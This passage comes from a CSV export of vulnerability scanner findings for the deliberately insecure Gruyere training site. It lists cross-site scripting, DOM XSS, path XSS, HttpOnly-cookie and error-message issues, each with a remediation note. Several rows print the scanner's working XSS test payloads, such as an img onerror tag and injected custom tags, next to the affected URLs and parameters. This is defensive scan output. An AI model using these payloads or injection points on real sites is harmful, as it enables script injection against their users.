The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Unlike traditional Cross-Site Scripting (XSS), where the client is able to inject scripts into a request and have the server return the script to the client, DOM XSS does not require that a request be sent to the server and may be abused entirely within the loaded page.

This occurs when elements of the DOM (known as the sources) are able to be manipulated to contain untrusted data, which the client-side scripts (known as the sinks) use or execute an unsafe way.

Scanner has discovered that by inserting an HTML element into the page's DOM inputs (sources), it was possible to then have the HTML element rendered as part of the page by the sink.","Cross Site Scripting",98109,"DOM-based Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/DOM_Based_XSS, https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet",Medium,"Client-side document rewriting, redirection, or other sensitive action, using untrusted data, should be avoided wherever possible, as these may not be inspected by server side filtering.
To remedy DOM XSS vulnerabilities where these sensitive document actions must be used, it is essential to:
1. Ensure any untrusted data is treated as text, as opposed to being interpreted as code or mark-up within the page. 2. Escape untrusted data prior to being used within the page. Escaping methods will vary depending on where the untrusted data is being used. (See references for details.) 3. Use `document.createElement`, `element.setAttribute`, `element.appendChild`, etc. to build dynamic interfaces as opposed to HTML rendering methods such as `document.write`, `document.writeIn`, `element.innerHTML`, or `element.outerHTML `etc.",,"826cea4c-ea63-49a3-b204-d423c1b310a9",2022-03-15T21:06:17.432Z,2022-03-15T14:06:26Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/feed.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 | <img src=x onerror=window.top._tenable_wasscan_js_namespace_taint_tracer.log_execution_flow_sink() />",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"82781031-e422-4c21-9848-6ffe738d68b2",2022-03-15T21:06:17.432Z,2022-03-15T14:01:03Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"829656ee-9eed-433a-9f8d-3001d2be652e",2022-03-15T21:06:17.432Z,2022-03-15T17:51:47Z,"On https://google-gruyere.appspot.com/563265819128830739647592760263700851280/newaccount.gtl debug error messages were detected. Please see the attached response for full details.
<b>WARNING: Gruyere is not secure.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"82b7efe9-cdc5-42ce-b436-f65206d1cd8d",2022-03-15T18:42:41.743Z,2022-03-15T17:38:44Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/editprofile.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | </script><my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"880aa562-8f5b-4383-acfc-a716a1669211",2022-03-15T21:06:17.432Z,2022-03-15T15:39:42Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/563265819128830739647592760263700851280/snippets.gtl?uid=cheddar' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"Detects any known CAPTCHA products being used on a page.","Web Applications",98083,"CAPTCHA Detection",,2017-03-31T00:00:00Z,2017-10-16T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"8a01a858-2239-4315-b9c3-bd0d2634dee0",2022-03-15T21:06:17.432Z,2022-03-15T15:10:35Z,"A Recaptcha CAPTCHA has been detected on https://google-gruyere.appspot.com/resetbutton/563265819128830739647592760263700851280 due to tag  <div class=""g-recaptcha"" data-sitekey=""6LfKTycUAAAAAOLes3JooIZ0gi8BNy81n_mY3fdD"">",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","The HttpOnly flag assists in the prevention of client side-scripts (such as JavaScript) from accessing and using the cookie.

This can help prevent XSS attacks from targeting the cookies holding the client's session token (setting the HttpOnly flag does not prevent, nor safeguard against XSS vulnerabilities themselves).","Web Applications",98063,"Cookie Without HttpOnly Flag Detected",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A5], cwe=[1004], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/HttpOnly",Low,"The initial step to remedy this would be to determine whether any client-side scripts (such as JavaScript) need to access the cookie and if not, set the HttpOnly flag.
It should be noted that some older browsers are not compatible with the HttpOnly flag; therefore, setting this flag will not protect those clients against this form of attack.",,"8d66a64e-64ad-45ba-adb5-b057daa92a08",2022-03-15T18:42:41.743Z,2022-03-15T17:17:24Z,"The scanner detected a cookie named 'GRUYERE_ID' that does not set the HttpOnly flag.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"8ea60be2-1ff2-4e81-9bdf-3bc0d1add4d1",2022-03-15T21:06:17.432Z,2022-03-15T16:14:46Z,"The scanner was able to exploit a Cross-Site Scripting by injecting an html tag with a custom attribute.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Unlike traditional Cross-Site Scripting (XSS), where the client is able to inject scripts into a request and have the server return the script to the client, DOM XSS does not require that a request be sent to the server and may be abused entirely within the loaded page.

This occurs when elements of the DOM (known as the sources) are able to be manipulated to contain untrusted data, which the client-side scripts (known as the sinks) use or execute an unsafe way.

Scanner has discovered that by inserting an HTML element into the page's DOM inputs (sources), it was possible to then have the HTML element rendered as part of the page by the sink.","Cross Site Scripting",98109,"DOM-based Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/DOM_Based_XSS, https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet",Medium,"Client-side document rewriting, redirection, or other sensitive action, using untrusted data, should be avoided wherever possible, as these may not be inspected by server side filtering.
To remedy DOM XSS vulnerabilities where these sensitive document actions must be used, it is essential to:
1. Ensure any untrusted data is treated as text, as opposed to being interpreted as code or mark-up within the page. 2. Escape untrusted data prior to being used within the page. Escaping methods will vary depending on where the untrusted data is being used. (See references for details.) 3. Use `document.createElement`, `element.setAttribute`, `element.appendChild`, etc. to build dynamic interfaces as opposed to HTML rendering methods such as `document.write`, `document.writeIn`, `element.innerHTML`, or `element.outerHTML `etc.",,"8fd7afca-857b-4a43-aacc-d4e703ce562a",2022-03-15T21:06:17.432Z,2022-03-15T18:48:17Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/656501648683287335357107855369111942818/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 | <img src=x onerror=window.top._tenable_wasscan_js_namespace_taint_tracer.log_execution_flow_sink() />",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"919c7a37-45c7-4abc-8afe-9ce1d53f63ef",2022-03-15T21:06:17.432Z,2022-03-15T19:28:48Z,"A form with no identifier has been detected on the following URL https://google-gruyere.appspot.com/563265819128830739647592760263700851280/editprofile.gtl with input fields : 
- private_snippet (no type specified)
- action (hidden)
- name (text)
- oldpw (password)
- pw (password)
- icon (text)
- web_site (text)
- color (text)

This form is submitted by using the following action : https://google-gruyere.appspot.com/563265819128830739647592760263700851280/saveprofile",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"9368635d-e5fa-4666-8da1-98652e65bd75",2022-03-15T21:06:17.432Z,2022-03-15T16:26:36Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"9542c71b-b48d-4b67-8354-e028eec5ef72",2022-03-15T21:06:17.432Z,2022-03-15T14:01:04Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"9aa9a461-348d-4024-84ca-738a4a30b555",2022-03-15T21:06:17.432Z,2022-03-15T17:14:36Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Unlike traditional Cross-Site Scripting (XSS), where the client is able to inject scripts into a request and have the server return the script to the client, DOM XSS does not require that a request be sent to the server and may be abused entirely within the loaded page.

This occurs when elements of the DOM (known as the sources) are able to be manipulated to contain untrusted data, which the client-side scripts (known as the sinks) use or execute an unsafe way.

Scanner has discovered that by inserting an HTML element into the page's DOM inputs (sources), it was possible to then have the HTML element rendered as part of the page by the sink.","Cross Site Scripting",98109,"DOM-based Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/DOM_Based_XSS, https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet",Medium,"Client-side document rewriting, redirection, or other sensitive action, using untrusted data, should be avoided wherever possible, as these may not be inspected by server side filtering.
To remedy DOM XSS vulnerabilities where these sensitive document actions must be used, it is essential to:
1. Ensure any untrusted data is treated as text, as opposed to being interpreted as code or mark-up within the page. 2. Escape untrusted data prior to being used within the page. Escaping methods will vary depending on where the untrusted data is being used. (See references for details.) 3. Use `document.createElement`, `element.setAttribute`, `element.appendChild`, etc. to build dynamic interfaces as opposed to HTML rendering methods such as `document.write`, `document.writeIn`, `element.innerHTML`, or `element.outerHTML `etc.",,"9b39e587-aa26-40b9-bba6-e90763583064",2022-03-15T21:06:17.432Z,2022-03-15T16:52:52Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 | <img src=x onerror=window.top._tenable_wasscan_js_namespace_taint_tracer.log_execution_flow_sink() />",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"9b3b7659-18f9-4fb3-b8e9-b5e641566f0f",2022-03-15T21:06:17.432Z,2022-03-15T14:06:02Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom html tag.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

